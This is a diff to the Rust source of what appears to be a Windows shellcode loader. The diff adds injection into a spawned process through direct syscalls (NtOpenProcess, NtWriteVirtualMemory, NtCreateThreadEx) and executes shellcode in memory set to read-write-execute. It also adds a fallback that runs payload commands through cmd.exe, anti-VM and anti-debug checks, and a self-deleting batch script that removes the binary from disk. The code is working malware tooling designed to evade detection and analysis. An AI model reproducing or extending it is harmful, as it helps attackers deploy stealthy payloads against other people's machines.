@@ -7,10 +7,12 @@ use std::fs;
 use std::io::Read;
 use std::path::PathBuf;
 use std::process::Command;
+use windows_sys::Win32::Foundation::CloseHandle;
 use windows_sys::Win32::Globalization::EnumSystemLocalesA;
 use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 use windows_sys::Win32::System::Memory::{
-    VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
+    VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
+    PAGE_READWRITE,
 };
 use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};
 
@@ -118,7 +120,7 @@ unsafe fn get_ssn(name: &str) -> Option<u32> {
     // But since we unhooked, we expect clean syscalls.
     // However, let's implement a robust check (Hell's Gate style fallback)
 
-    for _ in 0..5 {
+    for _ in 0..64 {
         // Check a few bytes/instructions
         if *addr == 0xE9 {
             // It's a jump, follow it?
@@ -307,10 +309,144 @@ unsafe fn exec_apc(base: *mut core::ffi::c_void) {
     }
 }
 
+unsafe fn to_ansi_mut(s: &str) -> Vec<u8> {
+    let mut v = s.as_bytes().to_vec();
+    v.push(0);
+    v
+}
+
+#[repr(C)]
+struct OBJECT_ATTRIBUTES {
+    Length: u32,
+    RootDirectory: isize,
+    ObjectName: isize,
+    Attributes: u32,
+    SecurityDescriptor: isize,
+    SecurityQualityOfService: isize,
+}
+
+#[repr(C)]
+struct CLIENT_ID {
+    UniqueProcess: isize,
+    UniqueThread: isize,
+}
+
+unsafe fn exec_remote(sc: &[u8], path: &str) {
+    let child = std::process::Command::new(path).spawn();
+    let Ok(child) = child else { return };
+    let pid = child.id();
+
+    let ssn_open = get_ssn("NtOpenProcess").unwrap_or(0x26);
+    let ssn_alloc = get_ssn("NtAllocateVirtualMemory").unwrap_or(0x18);
+    let ssn_write = get_ssn("NtWriteVirtualMemory").unwrap_or(0x3A);
+    let ssn_protect = get_ssn("NtProtectVirtualMemory").unwrap_or(0x50);
+    let ssn_create = get_ssn("NtCreateThreadEx").unwrap_or(0xBD);
+    let ssn_wait = get_ssn("NtWaitForSingleObject").unwrap_or(0x4);
+
+    let mut h_proc: isize = 0;
+    let mut oa: OBJECT_ATTRIBUTES = core::mem::zeroed();
+    oa.Length = core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
+    let mut cid = CLIENT_ID {
+        UniqueProcess: pid as isize,
+        UniqueThread: 0,
+    };
+    let st_open = syscall(
+        ssn_open,
+        &mut h_proc as *mut _ as usize,
+        0x1FFFFF,
+        &mut oa as *mut _ as usize,
+        &mut cid as *mut _ as usize,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+    );
+    if st_open != 0 || h_proc == 0 {
+        return;
+    }
+
+    let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
+    let mut size = sc.len();
+    let _ = syscall(
+        ssn_alloc,
+        h_proc as usize,
+        &mut base as *mut _ as usize,
+        0,
+        &mut size as *mut _ as usize,
+        (MEM_COMMIT | MEM_RESERVE) as usize,
+        PAGE_READWRITE as usize,
+        0,
+        0,
+        0,
+        0,
+        0,
+    );
+    if base.is_null() {
+        let _ = CloseHandle(h_proc as *mut core::ffi::c_void);
+        return;
+    }
+    let mut written = 0usize;
+    let _ = syscall(
+        ssn_write,
+        h_proc as usize,
+        base as usize,
+        sc.as_ptr() as usize,
+        sc.len(),
+        &mut written as *mut _ as usize,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+    );
+    let mut old = 0usize;
+    let _ = syscall(
+        ssn_protect,
+        h_proc as usize,
+        &mut base as *mut _ as usize,
+        &mut size as *mut _ as usize,
+        PAGE_EXECUTE_READ as usize,
+        &mut old as *mut _ as usize,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+    );
+    let mut h_thread: isize = 0;
+    let st_thr = syscall(
+        ssn_create,
+        &mut h_thread as *mut _ as usize,
+        0x1FFFFF,
+        0,
+        h_proc as usize,
+        base as usize,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+    );
+    if st_thr == 0 && h_thread != 0 {
+        let _ = syscall(ssn_wait, h_thread as usize, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        let _ = CloseHandle(h_thread as *mut core::ffi::c_void);
+    }
+    let _ = CloseHandle(h_proc as *mut core::ffi::c_void);
+}
+
 fn main() {
     let skip_anti = std::env::var("RS_PACK_SKIP_ANTI").ok().as_deref() == Some("1");
-    if !skip_anti && (anti::anti_debug_triggered() || anti::anti_vm_triggered()) {
-        eprintln!("anti triggered");
+    if !skip_anti && anti::anti_vm_triggered() {
+        self_delete();
+        std::process::exit(1);
+    }
+    if !skip_anti && anti::anti_debug_triggered() {
         std::process::exit(1);
     }
 
@@ -392,7 +528,9 @@ fn main() {
 
     if payload.starts_with(b"CMD\0") {
         let cmd = String::from_utf8_lossy(&payload[4..]).to_string();
-        let _ = Command::new(cmd).spawn();
+        if Command::new(&cmd).spawn().is_err() {
+            let _ = Command::new("cmd.exe").arg("/C").arg(&cmd).spawn();
+        }
         return;
     }
     if payload.starts_with(b"SC\0") {
@@ -400,8 +538,21 @@ fn main() {
         if p >= payload.len() {
             return;
         }
-        let _mode = payload[p];
+        let mode = payload[p];
         p += 1;
+        let mut remote_path: Option<String> = None;
+        if mode == 1 {
+            if p + 4 > payload.len() {
+                return;
+            }
+            let rlen = u32::from_le_bytes(payload[p..p + 4].try_into().unwrap()) as usize;
+            p += 4;
+            if p + rlen > payload.len() {
+                return;
+            }
+            remote_path = Some(String::from_utf8_lossy(&payload[p..p + rlen]).to_string());
+            p += rlen;
+        }
         if p + 4 > payload.len() {
             return;
         }
@@ -415,57 +566,69 @@ fn main() {
         unsafe {
             let ssn_alloc = get_ssn("NtAllocateVirtualMemory").unwrap_or(0x18);
             let ssn_protect = get_ssn("NtProtectVirtualMemory").unwrap_or(0x50);
-
-            let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
-            let mut size = sc_len;
-            let process_handle = -1isize as usize; // Current process
-
-            // NtAllocateVirtualMemory
-            let status = syscall(
-                ssn_alloc,
-                process_handle,
-                &mut base as *mut _ as usize,
-                0,
-                &mut size as *mut _ as usize,
-                (MEM_COMMIT | MEM_RESERVE) as usize,
-                PAGE_READWRITE as usize,
-                0,
-                0,
-                0,
-                0,
-                0,
-            );
-
-            if status == 0 && !base.is_null() {
-                let dst = core::slice::from_raw_parts_mut(base as *mut u8, sc_len);
-                dst.copy_from_slice(sc);
-
-                let mut old = 0;
-                // NtProtectVirtualMemory
-                let status_prot = syscall(
-                    ssn_protect,
+            if mode == 1 {
+                if let Some(s) = remote_path.as_deref() {
+                    exec_remote(sc, s);
+                }
+            } else {
+                let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
+                let mut size = sc_len;
+                let process_handle = -1isize as usize;
+                let status = syscall(
+                    ssn_alloc,
                     process_handle,
                     &mut base as *mut _ as usize,
-                    &mut size as *mut _ as usize,
-                    PAGE_EXECUTE_READ as usize,
-                    &mut old as *mut _ as usize,
                     0,
+                    &mut size as *mut _ as usize,
+                    (MEM_COMMIT | MEM_RESERVE) as usize,
+                    PAGE_READWRITE as usize,
                     0,
                     0,
                     0,
                     0,
                     0,
                 );
-
-                if status_prot == 0 {
-                    // Strategy Selection:
-                    // Use a simple pseudo-random choice based on PID
-                    let pid = std::process::id();
-                    match pid % 3 {
-                        0 => exec_fiber(base),
-                        1 => exec_callback(base),
-                        2 => exec_apc(base),
-                        _ => exec_fiber(base),
+                if status == 0 && !base.is_null() {
+                    let dst = core::slice::from_raw_parts_mut(base as *mut u8, sc_len);
+                    dst.copy_from_slice(sc);
+                    let mut old = 0;
+                    let status_prot = syscall(
+                        ssn_protect,
+                        process_handle,
+                        &mut base as *mut _ as usize,
+                        &mut size as *mut _ as usize,
+                        PAGE_EXECUTE_READWRITE as usize,
+                        &mut old as *mut _ as usize,
+                        0,
+                        0,
+                        0,
+                        0,
+                        0,
+                        0,
+                    );
+                    if status_prot == 0 {
+                        let ssn_create = get_ssn("NtCreateThreadEx").unwrap_or(0xBD);
+                        let ssn_wait = get_ssn("NtWaitForSingleObject").unwrap_or(0x4);
+                        let mut h_thread: isize = 0;
+                        let st_thr = syscall(
+                            ssn_create,
+                            &mut h_thread as *mut _ as usize,
+                            0x1FFFFF,
+                            0,
+                            process_handle,
+                            base as usize,
+                            0,
+                            0,
+                            0,
+                            0,
+                            0,
+                            0,
+                        );
+                        if st_thr == 0 && h_thread != 0 {
+                            let _ =
+                                syscall(ssn_wait, h_thread as usize, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+                            let _ = CloseHandle(h_thread as *mut core::ffi::c_void);
+                        }
                     }
                 }
             }
@@ -492,5 +655,18 @@ fn main() {
         if fs::write(&out_path, &payload).is_ok() {
             let _ = Command::new(&out_path).spawn();
         }
+    }
+}
+
+fn self_delete() {
+    if let Ok(exe_path) = std::env::current_exe() {
+        let mut bat = std::env::temp_dir();
+        bat.push(format!("{:x}_rm.cmd", std::process::id()));
+        let script = format!(
+            "@echo off\r\nping -n 2 127.0.0.1 >nul\r\ndel /f /q \"{}\"\r\ndel /f /q \"%~f0\"\r\n",
+            exe_path.display()
+        );
+        let _ = fs::write(&bat, script);
+        let _ = Command::new("cmd.exe").arg("/C").arg(&bat).spawn();
     }
 }
